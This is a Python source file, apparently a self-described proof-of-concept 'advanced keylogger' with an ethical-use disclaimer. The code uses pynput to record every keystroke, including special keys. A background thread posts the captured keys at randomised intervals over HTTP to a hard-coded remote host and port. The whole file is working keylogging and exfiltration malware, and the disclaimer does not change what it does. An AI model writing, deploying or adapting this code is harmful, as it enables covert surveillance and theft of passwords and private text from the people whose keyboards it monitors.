from pynput import keyboard
import os
from random import randint
from time import sleep
import requests
import threading
import ast

"""
DISCLAIMER:
    - This program is intented to be used for ethical and legal purposes only.
    - Illegal or unethical use of this software is prohibited.

Program: advanced-keylogger.py
Developer: CyberPanther232
Purpose: To demonstrate a proof-of-concept of a advanced python keylogger
Date Created: 05-11-2025
"""

REM_HOST = "10.23.23.86"
REM_PORT = 5000
data = []
data_lock = threading.Lock()

def send_info(host, port):
    global data
    while True:
        sleep(randint(1, 10))
        with data_lock:
            if data:
                try:
                    # Convert Python list to string exactly like in curl
                    payload = {
                        'data': str(data).replace("', '", "','")  # turns ['h', 'i', 'j'] â†’ "['h','i','j']"
                    }
                    response = requests.post(f"http://{host}:{port}/recv", data=payload)
                except Exception as e:
                    print(f"Send error: {e}")
                data.clear()
def on_press(key):
    global data
    try:
        with data_lock:
            if key == keyboard.Key.space:
                data.append(" ")
            elif key == keyboard.Key.enter:
                data.append("\n")
            elif key == keyboard.Key.tab:
                data.append("\t")
            elif hasattr(key, 'char') and key.char:
                data.append(key.char)
            else:
                data.append(f"[{key.name}]")
    except Exception as e:
        print(f"Error in on_press: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

def keyboard_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    t1 = threading.Thread(target=keyboard_listener, daemon=True)
    t2 = threading.Thread(target=send_info, args=(REM_HOST, REM_PORT), daemon=True)

    t1.start()
    t2.start()
    t1.join()
    t2.join()

if __name__ == "__main__":
    main()
